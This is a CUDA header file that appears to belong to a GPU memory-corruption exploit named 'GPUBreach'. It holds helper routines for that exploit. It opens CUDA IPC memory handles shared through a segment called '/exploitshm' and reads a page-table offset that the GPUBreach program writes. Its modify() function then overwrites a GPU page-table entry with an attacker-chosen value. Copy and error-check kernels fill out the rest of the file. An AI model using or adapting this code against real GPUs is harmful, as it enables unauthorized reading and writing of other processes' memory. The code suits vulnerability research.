#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sys/mman.h>
#include <unistd.h>
#include <utility>
#ifndef TRANSFER_CUH
#define TRANSFER_CUH

__global__ void memset_ptr(uint8_t *dst, uint64_t src, uint64_t size)
{
    for (size_t i = 0; i < size; i += 8)
    {
        *(uint64_t *)(dst + i) = src; // array-style access
    }
}

template <typename T> __global__ void cudaMemcpyKernel(T *dst, const T *src, size_t numElements)
{
    size_t idx = blockIdx.x * blockDim.x + threadIdx.x;
    size_t stride = blockDim.x * gridDim.x;
    for (size_t i = idx; i < numElements; i += stride)
    {
        dst[i] = src[i]; // array-style access
    }
}

// Custom memcpy (device-to-device by default)
template <typename T>
void cudaMemcpyArray(T *dst, const T *src, size_t numElements, cudaMemcpyKind kind = cudaMemcpyDeviceToDevice)
{
    // Choose reasonable launch configuration
    int blockSize = 256;
    int numBlocks = (numElements + blockSize - 1) / blockSize;

    // Launch the kernel if both pointers are device pointers
    if (kind == cudaMemcpyDeviceToDevice)
    {
        cudaMemcpyKernel<<<numBlocks, blockSize>>>(dst, src, numElements);
        cudaDeviceSynchronize();
    }
    else
    {
        // Fallback to standard cudaMemcpy for other directions
        cudaMemcpy(dst, src, numElements * sizeof(T), kind);
    }
}

__global__ void print_memory(uint8_t *array, uint64_t size)
{
    for (uint64_t i = 0; i < size; i += 8)
    {
        int sum = 0;
        for (uint64_t j = 0; j < 8; j++)
        {
            sum += *(array + i + j) & 0xff;
        }
        if (sum != 0)
        {
            printf("%x: ", i);
            for (uint64_t j = 0; j < 8; j++)
            {
                printf("%x ", *(array + i + j) & 0xff);
            }

            printf("\n");
        }
    }
}

void paused()
{
    std::cin.clear();
    while (std::cin.get() != '\n')
        ;
}

#define gpuErrchk(ans)                                                                                                 \
    {                                                                                                                  \
        gpuAssert((ans), __FILE__, __LINE__);                                                                          \
    }
inline void gpuAssert(cudaError_t code, const char *file, int line, bool abort = true)
{
    if (code != cudaSuccess)
    {
        fprintf(stderr, "GPUassert: %s %s %d\n", cudaGetErrorString(code), file, line);
        if (abort)
            exit(code);
    }
}

void *openIPCPointer(int i)
{
    void *pointer;
    // cudaIpcMemHandle_t handle;
    // std::ifstream file(filename, std::ios::binary);
    // file.read(reinterpret_cast<char*>(&handle), sizeof(&handle));
    // file.close();
    // cudaIpcOpenMemHandle(&pointer, handle,
    //                      cudaIpcMemLazyEnablePeerAccess);
    int shm_fd = shm_open("/exploitshm", O_RDWR, 0666);
    if (shm_fd == -1)
    {
        std::cerr << "Error opening shared memory" << std::endl;
    }

    // Step 2: Map shared memory into address space
    cudaIpcMemHandle_t *shared_data =
        (cudaIpcMemHandle_t *)mmap(0, sizeof(cudaIpcMemHandle_t) * 2, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_data == MAP_FAILED)
    {
        std::cerr << "Error mapping shared memory" << std::endl;
    }
    gpuErrchk(cudaPeekAtLastError());
    cudaIpcOpenMemHandle(&pointer, shared_data[i], cudaIpcMemLazyEnablePeerAccess);
    gpuErrchk(cudaPeekAtLastError());
    munmap(shared_data, sizeof(cudaIpcMemHandle_t) * 2);
    close(shm_fd);
    std::cout << "Opened CUDA IPC pointer from " << pointer << '\n';
    return pointer;
}

uint64_t getPTOfs(std::string filename)
{
    std::cout << "Please go to GPUBreach program terminal to continue. \n"
                 "Press\033[1;32mEnter Key\033[0m after GPUBreach has finished executing to continue..."
              << '\n';
    paused();
    uint64_t ofs;
    std::ifstream file(filename, std::ios::binary);
    file.read(reinterpret_cast<char *>(&ofs), sizeof(ofs));
    file.close();
    return ofs;
}

void modify(void *pointer, uint64_t ofs, uint64_t PTE)
{
    memset_ptr<<<1, 1>>>((uint8_t *)pointer + ofs, PTE, 8);
    cudaDeviceSynchronize();
}

#endif /* TRANSFER_CUH */
